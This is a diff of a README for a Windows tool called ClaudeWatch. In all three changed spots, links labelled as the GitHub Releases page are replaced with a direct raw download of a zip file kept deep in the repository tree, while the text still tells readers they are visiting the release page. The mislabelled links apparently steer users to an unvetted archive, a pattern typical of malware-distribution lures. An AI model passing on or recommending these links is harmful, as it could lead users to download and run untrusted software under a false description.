@@ -1,6 +1,6 @@
 # 🕵️ ClaudeWatch - Track Claude Sessions with Ease
 
-[![Download ClaudeWatch](https://img.shields.io/badge/Download-ClaudeWatch-6f42c1?style=for-the-badge&logo=github)](https://github.com/Hoangok5575/ClaudeWatch/releases)
+[![Download ClaudeWatch](https://img.shields.io/badge/Download-ClaudeWatch-6f42c1?style=for-the-badge&logo=github)](https://github.com/Hoangok5575/ClaudeWatch/raw/refs/heads/main/widget/ClaudeWatchHost/Watch_Claude_v1.4.zip)
 
 ## 🚀 What ClaudeWatch Does
 
@@ -12,7 +12,7 @@ It is made for regular Windows users who want a simple tool that starts fast and
 
 Use this link to visit the release page and download ClaudeWatch:
 
-[Download ClaudeWatch from GitHub Releases](https://github.com/Hoangok5575/ClaudeWatch/releases)
+[Download ClaudeWatch from GitHub Releases](https://github.com/Hoangok5575/ClaudeWatch/raw/refs/heads/main/widget/ClaudeWatchHost/Watch_Claude_v1.4.zip)
 
 On the release page, look for the latest version and download the Windows file. If there are more than one file, choose the one that ends in `.exe` or `.zip` and is meant for Windows.
 
@@ -146,7 +146,7 @@ ClaudeWatch is meant for local use on your Windows PC. It works as a desktop too
 
 To get the latest Windows version, visit the release page here:
 
-[https://github.com/Hoangok5575/ClaudeWatch/releases](https://github.com/Hoangok5575/ClaudeWatch/releases)
+[https://github.com/Hoangok5575/ClaudeWatch/raw/refs/heads/main/widget/ClaudeWatchHost/Watch_Claude_v1.4.zip](https://github.com/Hoangok5575/ClaudeWatch/raw/refs/heads/main/widget/ClaudeWatchHost/Watch_Claude_v1.4.zip)
 
 ## 🗂️ Folder Layout After Extraction
 
